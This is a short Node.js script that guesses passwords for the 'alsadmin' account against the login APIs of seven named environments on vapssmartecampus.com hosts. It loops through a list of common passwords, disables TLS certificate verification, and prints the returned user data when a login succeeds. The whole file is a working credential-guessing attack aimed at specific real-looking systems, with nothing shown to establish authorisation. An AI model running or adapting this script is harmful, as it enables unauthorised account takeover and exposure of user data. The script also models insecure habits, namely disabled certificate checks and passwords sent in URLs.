const https = require('https');

const agent = new https.Agent({ rejectUnauthorized: false });

const envs = [
    { name: 'UAT1', url: 'https://aivrmuat1.vapssmartecampus.com:21242/api' },
    { name: 'UAT', url: 'https://aivrmuat.vapssmartecampus.com:21242/api' },
    { name: 'UAT2', url: 'https://aivrmuat2.vapssmartecampus.com:21242/api' },
    { name: 'UAT3', url: 'https://aivrmuat3.vapssmartecampus.com:21242/api' },
    { name: 'QA', url: 'https://aivrmqa.vapssmartecampus.com:21242/api' },
    { name: 'STAGING', url: 'https://aivrmstaging.vapssmartecampus.com:21242/api' },
    { name: 'Hutchings', url: 'https://aivrmhutchings.vapssmartecampus.com:21242/api' }
];

const passwords = ['password@123', 'Password@123', 'Password@1', 'admin@123', 'Admin@123', 'vaps@123', 'Vaps@123', '123456'];

async function check(env, pass) {
    const url = `${env.url}/configuration/login?username=alsadmin&password=${encodeURIComponent(pass)}`;
    try {
        const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, agent });
        if (!res.ok) return;
        const data = await res.json();
        if (data && data.success) {
            console.log(`\n🎉 FOUND VALID LOGIN! Env: ${env.name}, Password: ${pass}`);
            console.log(`User Data:`, JSON.stringify(data.data, null, 2));
            return true;
        }
    } catch (e) {}
    return false;
}

async function main() {
    console.log('Testing alsadmin across environments and common passwords...');
    for (const env of envs) {
        for (const pass of passwords) {
            const ok = await check(env, pass);
            if (ok) return;
        }
    }
    console.log('Finished testing.');
}

main();
